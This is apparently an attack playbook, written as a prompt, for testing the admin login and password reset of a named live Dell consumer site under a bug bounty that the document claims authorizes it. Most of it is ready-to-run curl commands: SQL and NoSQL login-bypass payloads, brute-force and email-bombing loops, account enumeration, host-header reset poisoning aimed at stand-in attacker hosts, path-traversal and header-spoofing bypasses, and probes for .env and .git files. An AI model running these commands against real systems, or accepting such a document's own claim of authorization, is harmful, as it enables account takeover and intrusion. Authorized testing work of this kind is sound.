# Auth Security Testing Prompt — Admin Login & Password Reset
# Target: https://www.dellconsumeroffer.com/admin/
# Authorization: Dell Technologies Application Bug Bounty (Bugcrowd)
# Focus: Admin login, password reset, authentication & authorization flaws

---

## IMPORTANT: Authorization Context

This testing is authorized under the Dell Technologies Application Bug Bounty program on Bugcrowd.
Scope: "Any Verified Dell-Controlled Endpoint (domains/IP space/etc.)"
Rules: Non-destructive testing only. No DoS, no data destruction, no social engineering.
Prior finding: IDOR at /home/claim_details/{id} — P1, $2,500, resolved Dec 2023.

---

## PHASE 1: RECONNAISSANCE & TECHNOLOGY FINGERPRINTING

### 1.1 Identify Backend Technology Stack

```bash
# Fetch the admin page and inspect headers
curl -sI https://www.dellconsumeroffer.com/admin/ | grep -iE 'server|x-powered|x-frame|x-xss|content-security|set-cookie|x-aspnet|x-request'

# Fetch the forgot password page
curl -sI https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot

# Check for common framework indicators
curl -s https://www.dellconsumeroffer.com/admin/ | grep -iE 'csrf|token|_token|__RequestVerificationToken|csrfmiddlewaretoken|authenticity_token|__VIEWSTATE|laravel|rails|django|express|codeigniter|ci_session'

# Check cookies for framework fingerprints
curl -sI https://www.dellconsumeroffer.com/admin/ | grep -i 'set-cookie'
# Look for: ci_session (CodeIgniter), PHPSESSID (PHP), laravel_session, connect.sid (Express), JSESSIONID (Java)
```

### 1.2 JavaScript File Discovery & Analysis

```bash
# Extract ALL JS file URLs from the admin page
curl -s https://www.dellconsumeroffer.com/admin/ | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'
curl -s https://www.dellconsumeroffer.com/admin/ | grep -oE "src='[^']*\.js[^']*'" | sed "s/src='//;s/'//"

# Also extract from forgot password page
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot | grep -oE 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//'

# Extract inline script blocks
curl -s https://www.dellconsumeroffer.com/admin/ | grep -oP '<script[^>]*>.*?</script>' 

# For EACH JS file found, download and analyze:
# curl -s https://www.dellconsumeroffer.com/path/to/script.js > /tmp/script.js

# Search JS files for sensitive patterns:
# grep -iE 'api[_-]?key|apikey|secret|password|token|auth|admin|endpoint|base[_-]?url|firebase|aws|private|credential' /tmp/script.js
# grep -iE 'fetch\(|axios\.|.ajax\(|XMLHttpRequest|.post\(|.get\(' /tmp/script.js
# grep -iE '/api/|/v1/|/v2/|/internal/|/admin/|/auth/|/login|/reset|/forgot|/set_password' /tmp/script.js
# grep -iE 'localStorage|sessionStorage|document\.cookie' /tmp/script.js
# grep -iE 'eval\(|innerHTML|document\.write|.html\(' /tmp/script.js
```

### 1.3 Full HTML Source Analysis

```bash
# Download full page source for analysis
curl -s https://www.dellconsumeroffer.com/admin/ > /tmp/admin_page.html
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot > /tmp/forgot_page.html

# Extract all forms with actions and methods
grep -oP '<form[^>]*>' /tmp/admin_page.html
grep -oP '<form[^>]*>' /tmp/forgot_page.html

# Extract all input fields (find hidden fields, CSRF tokens, IDs)
grep -oP '<input[^>]*>' /tmp/admin_page.html
grep -oP '<input[^>]*>' /tmp/forgot_page.html

# Extract all links and endpoints
grep -oE 'href="[^"]*"' /tmp/admin_page.html | sort -u
grep -oE 'action="[^"]*"' /tmp/admin_page.html

# Look for comments with sensitive info
grep -oP '<!--.*?-->' /tmp/admin_page.html
grep -oP '<!--.*?-->' /tmp/forgot_page.html

# Extract all API endpoints from inline JS
grep -oE '/[a-zA-Z0-9_/]*' /tmp/admin_page.html | sort -u | grep -iE 'api|auth|admin|user|pass|reset|login|set_|forgot|claim|verify|token|session|email'
```

### 1.4 Directory & Endpoint Discovery

```bash
# Based on known URL structure, test related admin paths
for path in \
  "admin/login" \
  "admin/dashboard" \
  "admin/users" \
  "admin/settings" \
  "admin/set_password" \
  "admin/set_password/set_pass" \
  "admin/set_password/set_pass/forgot" \
  "admin/set_password/set_pass/reset" \
  "admin/set_password/set_pass/change" \
  "admin/set_password/set_pass/verify" \
  "admin/register" \
  "admin/signup" \
  "admin/logout" \
  "admin/profile" \
  "admin/api" \
  "admin/config" \
  "api/admin" \
  "api/v1/admin" \
  "api/auth/login" \
  "api/auth/forgot" \
  "api/auth/reset" \
  "api/users" \
  "home/claim_details" \
  "admin/set_password/set_pass/forgot/" \
  "//admin/set_password/set_pass/forgot" \
  "admin/../admin/set_password" \
; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://www.dellconsumeroffer.com/$path")
  echo "$code $path"
done

# Check robots.txt and sitemap for hidden paths
curl -s https://www.dellconsumeroffer.com/robots.txt
curl -s https://www.dellconsumeroffer.com/sitemap.xml
```

---

## PHASE 2: ADMIN LOGIN TESTING

### 2.1 Login Form Analysis

```bash
# Capture the full login form
curl -s https://www.dellconsumeroffer.com/admin/ | grep -A 20 '<form'

# Identify: 
# - Form action URL (where credentials are submitted)
# - Input field names (username/email field name, password field name)
# - Hidden fields (CSRF tokens, session IDs)
# - HTTP method (POST/GET — credentials in GET = vulnerability)

# Test login with dummy credentials to see error response
curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d 'email=test@test.com&password=test123' \
  -c /tmp/cookies.txt \
  -D /tmp/login_headers.txt \
  -o /tmp/login_response.html

# Check the response
cat /tmp/login_headers.txt
cat /tmp/login_response.html | head -100
```

### 2.2 Username/Email Enumeration (KB 17)

```bash
# Test with likely valid email format vs clearly invalid
# Compare response body length, timing, and content

# Valid-looking email
time curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d 'email=admin@dellconsumeroffer.com&password=wrongpassword' \
  -o /tmp/enum_valid.html -w '%{time_total}\n'

# Invalid email
time curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d 'email=definitelynotexist12345@fakefake.com&password=wrongpassword' \
  -o /tmp/enum_invalid.html -w '%{time_total}\n'

# Compare responses
diff /tmp/enum_valid.html /tmp/enum_invalid.html
wc -c /tmp/enum_valid.html /tmp/enum_invalid.html

# If responses differ = EMAIL ENUMERATION VULNERABILITY
# Check for differences in:
# - Error message text ("invalid password" vs "user not found")
# - Response length
# - Response time (timing side-channel)
# - HTTP status codes
# - Set-Cookie headers
```

### 2.3 Brute Force & Rate Limiting (KB 03)

```bash
# Test if rate limiting exists on login
for i in $(seq 1 15); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
    https://www.dellconsumeroffer.com/admin/ \
    -d 'email=admin@test.com&password=attempt'$i)
  echo "Attempt $i: $code"
done

# If all return same code with no lockout/CAPTCHA after 10+ attempts:
# = MISSING RATE LIMITING (report as finding)

# Check if account lockout exists
# (use a clearly test account if you have one)
```

### 2.4 CSRF on Login (KB 04)

```bash
# Check if login form has CSRF protection
curl -s https://www.dellconsumeroffer.com/admin/ | grep -iE 'csrf|_token|token.*hidden'

# If CSRF token exists, test if it's validated:
# Submit login without the token
curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d 'email=test@test.com&password=test123' \
  -o /tmp/no_csrf.html

# If login still processes without token = CSRF vulnerability
# Login CSRF allows attacker to log victim into attacker's account
```

### 2.5 SQL Injection on Login (KB 04)

```bash
# Test authentication bypass payloads (from payloads/auth-bypass-payloads.txt)
# Use ONLY safe, non-destructive payloads

# Classic SQL injection in email/username field
curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d "email=admin'--&password=anything" \
  -o /tmp/sqli1.html

curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d "email=admin' OR '1'='1'--&password=anything" \
  -o /tmp/sqli2.html

curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -d "email=admin' OR 1=1--&password=anything" \
  -o /tmp/sqli3.html

# NoSQL injection (if MongoDB backend)
curl -s -X POST https://www.dellconsumeroffer.com/admin/ \
  -H 'Content-Type: application/json' \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}' \
  -o /tmp/nosqli.html

# Check responses for SQL errors or successful auth
grep -iE 'error|sql|syntax|mysql|postgres|oracle|sqlite|query|warning|exception' /tmp/sqli*.html
```

---

## PHASE 3: PASSWORD RESET TESTING (PRIMARY FOCUS)

Reference: knowledge-base/14-password-reset.md, knowledge-base/50-ssrf-cloud-metadata-chains.md

### 3.1 Password Reset Form Analysis

```bash
# Get the forgot password form
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot > /tmp/forgot.html

# Extract form details
grep -oP '<form[^>]*>' /tmp/forgot.html
grep -oP '<input[^>]*>' /tmp/forgot.html
grep -oP 'action="[^"]*"' /tmp/forgot.html
grep -oP 'name="[^"]*"' /tmp/forgot.html

# Identify the form action URL and field names
# This tells you WHERE the reset request goes and WHAT parameters it expects
```

### 3.2 Email Enumeration via Reset (KB 17)

```bash
# Submit reset for valid-looking vs invalid emails
# Compare responses for enumeration

curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=admin@dellconsumeroffer.com' \
  -o /tmp/reset_valid.html -w 'Time: %{time_total}s, Size: %{size_download} bytes\n'

curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=nonexistent99999@fakefake.com' \
  -o /tmp/reset_invalid.html -w 'Time: %{time_total}s, Size: %{size_download} bytes\n'

# Compare
diff /tmp/reset_valid.html /tmp/reset_invalid.html
wc -c /tmp/reset_valid.html /tmp/reset_invalid.html

# Different messages = ENUMERATION
# Example: "Reset link sent" vs "Email not found"
```

### 3.3 Host Header Injection — Password Reset Poisoning (KB 50, CVE-2025-43930)

```bash
# THIS IS THE HIGH-VALUE TEST — same class as your 2023 P1

# Test 1: Basic Host header injection
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'Host: attacker-collaborator.example.com' \
  -d 'email=your-test-email@example.com' \
  -D /tmp/host1_headers.txt -o /tmp/host1_body.html

# Test 2: X-Forwarded-Host
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'X-Forwarded-Host: attacker-collaborator.example.com' \
  -d 'email=your-test-email@example.com' \
  -D /tmp/host2_headers.txt -o /tmp/host2_body.html

# Test 3: X-Host
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'X-Host: attacker-collaborator.example.com' \
  -d 'email=your-test-email@example.com' \
  -o /tmp/host3_body.html

# Test 4: Forwarded header (RFC 7239)
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'Forwarded: host=attacker-collaborator.example.com' \
  -d 'email=your-test-email@example.com' \
  -o /tmp/host4_body.html

# Test 5: Host with port injection
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'Host: dellconsumeroffer.com:80@attacker.example.com' \
  -d 'email=your-test-email@example.com' \
  -o /tmp/host5_body.html

# Test 6: Double Host header
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'Host: attacker.example.com' \
  -H 'Host: www.dellconsumeroffer.com' \
  -d 'email=your-test-email@example.com' \
  -o /tmp/host6_body.html

# If the password reset email contains a link using the injected host:
# = CRITICAL: Password Reset Poisoning → Account Takeover
# Check: use YOUR OWN email and inspect the reset link in the email you receive
# If the link domain is your injected value, that's a confirmed vulnerability
```

### 3.4 Reset Token Analysis (KB 14)

```bash
# Submit a reset request for YOUR OWN test account
# Then inspect the reset link you receive via email

# Check the reset URL structure:
# https://www.dellconsumeroffer.com/admin/set_password/set_pass/reset?token=XXXXX
# Analyze:
# 1. Token length (< 20 chars = weak)
# 2. Token charset (only digits = brute-forceable)
# 3. Token predictability (sequential? timestamp-based? MD5 of email?)
# 4. Token expiry (does it expire? when?)
# 5. Token reuse (can you use it multiple times?)

# If you get a reset token, test:
# a) Does the same token work after using it once? (reuse)
# b) Does it work after 24+ hours? (no expiry)
# c) Is a new token generated if you request reset again? (old token still valid?)
# d) Can you enumerate tokens? (sequential/predictable pattern)

# Test reset token in response body (token leakage)
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=your-test-email@example.com' \
  -o /tmp/reset_response.html

# Check if the token is in the response
grep -iE 'token|reset|hash|key|code|otp' /tmp/reset_response.html
# If the reset token appears in the HTTP response = TOKEN LEAKAGE vulnerability
```

### 3.5 Rate Limiting on Password Reset (KB 03)

```bash
# Test if you can flood reset requests (email bombing)
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
    https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
    -d 'email=test@test.com')
  echo "Attempt $i: $code"
done

# If all succeed without rate limiting:
# = NO RATE LIMITING on password reset (email bombing possible)
```

### 3.6 Password Reset CSRF (KB 04)

```bash
# Check if reset form has CSRF token
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot | grep -iE 'csrf|_token|token.*hidden'

# Submit without CSRF token
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=test@test.com' \
  -o /tmp/reset_no_csrf.html

# If it processes = CSRF on password reset
```

---

## PHASE 4: PATH NORMALIZATION & ACCESS CONTROL (KB 48)

Reference: knowledge-base/48-api-gateway-path-normalization.md, payloads/path-normalization-payloads.txt

### 4.1 Path Normalization Bypass

```bash
# Test if path manipulation bypasses authentication on admin routes
# Compare authenticated vs unauthenticated responses

# Trailing slash
curl -sI https://www.dellconsumeroffer.com/admin
curl -sI https://www.dellconsumeroffer.com/admin/

# Double slash
curl -sI https://www.dellconsumeroffer.com//admin/
curl -sI https://www.dellconsumeroffer.com//admin/set_password/set_pass/forgot

# Dot segment traversal
curl -sI https://www.dellconsumeroffer.com/home/../admin/
curl -sI https://www.dellconsumeroffer.com/admin/set_password/../../../admin/

# Encoded traversal
curl -sI https://www.dellconsumeroffer.com/%2e%2e/admin/
curl -sI https://www.dellconsumeroffer.com/admin/%2e%2e/admin/

# Double encoding
curl -sI https://www.dellconsumeroffer.com/%2561dmin/
curl -sI https://www.dellconsumeroffer.com/%252e%252e/admin/

# Case manipulation
curl -sI https://www.dellconsumeroffer.com/Admin/
curl -sI https://www.dellconsumeroffer.com/ADMIN/
curl -sI https://www.dellconsumeroffer.com/Admin/Set_Password/Set_Pass/Forgot

# Semicolon (if Java/Tomcat backend)
curl -sI 'https://www.dellconsumeroffer.com/admin;x=1/'
curl -sI 'https://www.dellconsumeroffer.com/admin;jsessionid=fake/'

# If any of these return different status codes or content than the normal path:
# = PATH NORMALIZATION BYPASS
```

### 4.2 HTTP Method Testing

```bash
# Test different HTTP methods on admin endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X $method \
    https://www.dellconsumeroffer.com/admin/)
  echo "$method: $code"
done

# Test method override headers
curl -s -X GET https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'X-HTTP-Method-Override: POST' \
  -d 'email=test@test.com' \
  -o /tmp/method_override.html

curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d '_method=PUT&email=test@test.com' \
  -o /tmp/method_override2.html
```

### 4.3 IDOR on Admin Password Reset (KB 13 — relates to your 2023 finding)

```bash
# Your 2023 bug was IDOR on /home/claim_details/{id}
# Test if similar patterns exist in admin password reset

# Check if the reset endpoint accepts user identifiers
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=test@test.com&user_id=1' \
  -o /tmp/idor_reset1.html

curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -d 'email=test@test.com&id=1' \
  -o /tmp/idor_reset2.html

# Test if set_pass endpoint has predictable IDs
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/1
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/2
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/100

# If different user data returned for different IDs = IDOR on admin reset
```

---

## PHASE 5: SESSION & COOKIE ANALYSIS (KB 02, KB 05)

### 5.1 Cookie Security Analysis

```bash
# Login or interact with the admin page and capture cookies
curl -sI -c /tmp/admin_cookies.txt https://www.dellconsumeroffer.com/admin/

cat /tmp/admin_cookies.txt

# Check each cookie for:
# - HttpOnly flag (missing = XSS can steal session)
# - Secure flag (missing = sent over HTTP)
# - SameSite attribute (missing = CSRF possible)
# - Domain scope (too broad = cookie shared across subdomains)
# - Path scope

# Inspect Set-Cookie headers
curl -sI https://www.dellconsumeroffer.com/admin/ | grep -i 'set-cookie'
# Look for: Secure, HttpOnly, SameSite=Strict|Lax|None, Path, Domain, Expires
```

### 5.2 Session Token Entropy

```bash
# Collect multiple session tokens and analyze entropy
for i in $(seq 1 10); do
  curl -sI https://www.dellconsumeroffer.com/admin/ | grep -i 'set-cookie' >> /tmp/session_tokens.txt
done

cat /tmp/session_tokens.txt
# If tokens are short, sequential, or predictable = SESSION PREDICTION vulnerability
```

---

## PHASE 6: SECURITY HEADER ANALYSIS

```bash
# Check security headers
curl -sI https://www.dellconsumeroffer.com/admin/ | grep -iE 'strict-transport|content-security-policy|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|feature-policy'

# Missing headers to report:
# - No Strict-Transport-Security = HSTS missing
# - No Content-Security-Policy = CSP missing
# - No X-Frame-Options = Clickjacking possible
# - No X-Content-Type-Options = MIME sniffing
# - No Referrer-Policy = Token leakage via Referer header

# Test X-Frame-Options (Clickjacking)
# If X-Frame-Options is missing, the admin login can be framed
# This enables clickjacking attacks on the admin panel
```

---

## PHASE 7: INFORMATION DISCLOSURE

### 7.1 Error Page Analysis

```bash
# Trigger error pages to discover stack traces, versions, internal paths
curl -s https://www.dellconsumeroffer.com/admin/nonexistent_page_12345
curl -s https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot?email=test%00@test.com
curl -s -X POST https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot \
  -H 'Content-Type: application/json' \
  -d '{invalid json'
curl -s https://www.dellconsumeroffer.com/admin/' \
  -o /tmp/error_page.html

# Check for framework error pages, stack traces, internal IPs
grep -iE 'exception|stack|trace|debug|internal|error|warning|fatal|codeigniter|laravel|django|express' /tmp/error_page.html
```

### 7.2 Sensitive File Discovery

```bash
# Check for exposed configuration/backup files
for file in \
  ".env" \
  ".git/config" \
  ".git/HEAD" \
  "web.config" \
  ".htaccess" \
  "config.php" \
  "database.yml" \
  "wp-config.php" \
  "phpinfo.php" \
  "info.php" \
  "server-status" \
  "server-info" \
  "elmah.axd" \
  "debug" \
  "console" \
  "swagger" \
  "api-docs" \
; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "https://www.dellconsumeroffer.com/$file")
  [ "$code" != "404" ] && echo "FOUND ($code): $file"
done
```

---

## PHASE 8: ADVANCED TESTS

### 8.1 XFF Bypass (KB 51, CVE-2024-47070)

```bash
# Test if admin panel trusts X-Forwarded-For for IP restrictions
curl -s https://www.dellconsumeroffer.com/admin/ \
  -H 'X-Forwarded-For: 127.0.0.1' -o /tmp/xff1.html

curl -s https://www.dellconsumeroffer.com/admin/ \
  -H 'X-Forwarded-For: 10.0.0.1' -o /tmp/xff2.html

curl -s https://www.dellconsumeroffer.com/admin/ \
  -H 'X-Real-IP: 127.0.0.1' -o /tmp/xff3.html

# Compare responses — if different from normal = XFF BYPASS
```

### 8.2 CORS Misconfiguration (KB 51, CVE-2024-41659)

```bash
# Test for reflected origin
curl -sI https://www.dellconsumeroffer.com/admin/ \
  -H 'Origin: https://evil.com' | grep -i 'access-control'

curl -sI https://www.dellconsumeroffer.com/admin/ \
  -H 'Origin: null' | grep -i 'access-control'

curl -sI https://www.dellconsumeroffer.com/admin/ \
  -H 'Origin: https://dellconsumeroffer.com.evil.com' | grep -i 'access-control'

# If Access-Control-Allow-Origin reflects attacker origin with credentials = CRITICAL
```

### 8.3 Open Redirect (for OAuth chaining — KB 47)

```bash
# Test for open redirects from admin area
curl -sI 'https://www.dellconsumeroffer.com/admin/login?redirect=https://evil.com' | grep -i 'location'
curl -sI 'https://www.dellconsumeroffer.com/admin/login?next=https://evil.com' | grep -i 'location'
curl -sI 'https://www.dellconsumeroffer.com/admin/login?return_url=https://evil.com' | grep -i 'location'
curl -sI 'https://www.dellconsumeroffer.com/admin/login?redirect_uri=https://evil.com' | grep -i 'location'
```

---

## REPORTING TEMPLATE

When you find a vulnerability, use this structure for your Bugcrowd report:

```
Title: [Vuln Type] - [Location] - [Impact]

Severity: P1/P2/P3/P4

VRT: [Select from Bugcrowd VRT taxonomy]

Target: https://www.dellconsumeroffer.com/admin/set_password/set_pass/forgot

Description:
[Clear description of the vulnerability]

Steps to Reproduce:
1. Navigate to [URL]
2. [Exact step]
3. [Exact step]
4. Observe [what happens]

Impact:
[What can an attacker do with this vulnerability]

Evidence:
[Screenshots, HTTP request/response, curl commands]

Remediation:
[How to fix it]

References:
[CVEs, OWASP references, CWE IDs]
```

---

## AUTH-AGENT KNOWLEDGE BASE REFERENCE

Use these files from the ZIP for detailed attack techniques:

| Test Area | KB File | Payload File |
|-----------|---------|-------------|
| Login bypass | 04-auth-bypass.md | auth-bypass-payloads.txt |
| Password reset | 14-password-reset.md | - |
| Enumeration | 17-enumeration.md | - |
| Session attacks | 05-session-attacks.md | - |
| IDOR (like your 2023 bug) | 13-permission-attacks.md | - |
| Host header injection | 50-ssrf-cloud-metadata-chains.md | advanced-chaining-payloads.txt |
| Path normalization | 48-api-gateway-path-normalization.md | path-normalization-payloads.txt |
| CSRF SameSite bypass | 47-jwt-oauth-advanced-2025.md | advanced-chaining-payloads.txt |
| Framework bypass | 33-framework-middleware-bypass.md | framework-bypass-payloads.txt |
| Emerging threats | 51-emerging-auth-threats-2025.md | - |
| WAF rules/detection | 52-detection-prevention-matrix.md | - |
